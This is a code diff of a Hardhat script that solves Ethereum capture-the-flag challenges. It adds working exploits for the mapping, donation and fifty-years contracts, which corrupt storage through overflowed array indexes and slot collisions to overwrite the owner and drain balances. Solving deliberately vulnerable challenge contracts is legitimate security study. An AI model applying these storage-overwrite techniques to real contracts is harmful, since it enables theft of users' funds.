@@ -2,6 +2,7 @@ import { ethers } from "hardhat";
 
 let signer: any
 let one_eth = ethers.utils.parseEther('1.0')
+const abiCoder = new ethers.utils.AbiCoder();
 
 function right_pad(b: Buffer, len: number, char = '\x00') {
 	let newb = Buffer.alloc(len, b)
@@ -11,16 +12,15 @@ function right_pad(b: Buffer, len: number, char = '\x00') {
 async function step(desc: string, promise: Promise<any>) {
 	console.log('\x1B[1;32m', desc, '\x1B[0m : ') 
 	let res = await promise
+	console.log('   # ', res.hash)
 	// auto-wait on transactions
-	if (res.wait) await res.wait()
-	console.log('   >', res)
+	if (res.wait) res = await res.wait()
+	console.log('   > ', res)
 	return res
 }
 
 // @param mapSlot ethers.BigNumber
 async function getMappingAtAddress(contract: string, mapSlot: any, at: String) {
-	const abiCoder = new ethers.utils.AbiCoder();
-                                                  
     return await ethers.provider.getStorageAt(contract, 
                     ethers.utils.keccak256(abiCoder.encode(
                      ['address', 'uint256'],      
@@ -317,13 +317,160 @@ async function retirementFundChallenge() {
 	await step('withdraw', target.collectPenalty({ gasLimit: 500_000 }))
 	return target
 }
+
+async function mappingChallenge() {
+    let target = new ethers.Contract(
+		'0x9A18c3F06023dc7d071DCF8840EeF9320609d5e0',
+		[
+            'function isComplete() public view returns (bool)',
+			'function set(uint256 key, uint256 value) public ',
+			'function get(uint256 key) public view returns (uint256)'
+        ], signer
+    )
+	const abiCoder = new ethers.utils.AbiCoder();
+	await target.set(0, 0xbabe)
+	await target.set(1, 0xb00b)
+	await target.set(2, 0xcafe)
+	let firstSlot = ethers.BigNumber.from(ethers.utils.keccak256(abiCoder.encode(
+		['uint256'], [1]
+	)))
+	let complSlot = ethers.BigNumber.from(2).pow(256).sub(firstSlot)
+	await target.set(complSlot, 1)
+	// 0 :: isComplete slot
+	// 1 :: map slot 
+	console.log(await ethers.provider.getStorageAt(target.address, 0))
+	console.log(await ethers.provider.getStorageAt(target.address, 1))
+	console.log(await ethers.provider.getStorageAt(target.address, firstSlot))
+	console.log(await ethers.provider.getStorageAt(target.address, firstSlot.add(1)))
+	return target
+}
+
+async function donationChallenge() {
+    let target = new ethers.Contract(
+		'0xf739eBB6EE753A479c8250eeCAfBFFc133Aef421',
+		[
+            'function isComplete() public view returns (bool)',
+			'function donate(uint256 etherAmount) public payable',
+			'function withdraw() public' 
+        ], signer
+    )
+
+	await step('overwriting owner', target.donate(
+		signer.address, { 
+			value: ethers.BigNumber.from(signer.address).div(
+				ethers.BigNumber.from(10).pow(36)),
+			gasLimit: 500_000
+	}))
+	await step('withdraw', target.withdraw())
+
+	return target
+}
+
+async function measurements() {
+	let measureFactory = await ethers.getContractFactory('Measure')
+	let measure = await measureFactory.deploy()
+
+	//await measure.show();
+	await measure.save(0)
+	await measure.save(2)
+	await measure.save(1)
+	await measure.save(3)
+	console.log(await measure.getQueue(0))
+	console.log(await measure.getQueue(1))
+	console.log(await measure.getQueue(2))
+	console.log(await measure.getQueue(3))
+	console.log('length', await ethers.provider.getStorageAt(measure.address, 0))
+	console.log(await ethers.provider.getStorageAt(measure.address,
+						   ethers.utils.keccak256(abiCoder.encode(
+							   ['uint256'], [0]))))
+}
+
+async function fiftyYears() {
+	let target = new ethers.Contract(
+		'0x820C7Bf576bCBf276f610C8Ed2CaE2b5B489C88E',
+		[
+            'function isComplete() public view returns (bool)',
+			'function upsert(uint256 index, uint256 timestamp) public payable',
+			'function withdraw(uint256 index) public'
+        ], signer
+	)
+
+	/*
+	let factory = await ethers.getContractFactory('FiftyYearsChallenge')
+	let deployed = await factory.deploy(signer.address, { value: one_eth })
+	target = deployed
+	*/
+
+	// first upsert code walk (index == 0)
+	//	upsert(0, ts)
+	//		TRUE: index >= head && index < queue.length
+	//			update queue[0]
+	// first upsert (index == 1)
+	//	upsert(1, ts)
+	//		FALSE: index < queue.length
+	//			ts >= queue[0].unlockTimestamp + 1 days
+	//			overwrite queue.length with msg.value
+	//			overwrite head with timestamp
+	// step 2
+	//	upsert()
+	
+	async function dumpStorage() {
+		console.log('[0] queue.length:', await ethers.provider.getStorageAt(target.address, 0))
+		console.log('[1] head        :', await ethers.provider.getStorageAt(target.address, 1))
+		let start = ethers.BigNumber.from(ethers.utils.keccak256(abiCoder.encode(
+			['uint256'], [0])))
+		for (let ix = 0; ix < 4; ix++) {
+			console.log('queue[',ix,'].amount:', await ethers.provider.getStorageAt(target.address, start.add(ix * 2 + 0)))
+			console.log('queue[',ix,'].timest:', await ethers.provider.getStorageAt(target.address, start.add(ix * 2 + 1)))
+		}
+	}
+	
+	// process A
+	if (true) {
+		let one_days = 24 * 60 * 60
+		console.log('starting balance:', await ethers.provider.getBalance(target.address))
+		await step('step 1', target.upsert(
+					100, 
+					801002003004,
+					{ value: 1 }))
+		await step('step 5', target.upsert(
+					200, 
+					802002003004,
+					{ value: 1 }))
+		await step('step 10', target.upsert(
+					300, 
+					ethers.BigNumber.from(2).pow(256).sub(one_days), 
+					{ value: 1 }))
+			// queue.length == 1
+			// head == -1 day
+			// queue[1] = { 1, -one_days }
+		await step('step 20', target.upsert(
+					400,
+					0,
+					{ value: 3 }))
+			// queue.length == 3
+			// head == 0
+			// queue[1] = { 3, 0 }
+		await dumpStorage()
+		await step('step 30', target.withdraw(3, { gasLimit: 500_000 }))
+		console.log('final balance:', await ethers.provider.getBalance(target.address))
+	}
+
+	// alternative process B
+	if (false) {
+		await step('step 1', target.upsert(1, '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff', { value: 100 }))
+			// after, head == uint256(-1)
+			// queue.length == 100
+	}
+	return target
+}                                      
+                                       
                                                   
 async function main() {                           
     signer = (await ethers.getSigners())[0];      
     console.log('signer', signer.address)         
-
-	let contract = await retirementFundChallenge()
-
+                                       
+	let contract = await fiftyYears()
 
 	/*
 	let challenge = new ethers.Contract(
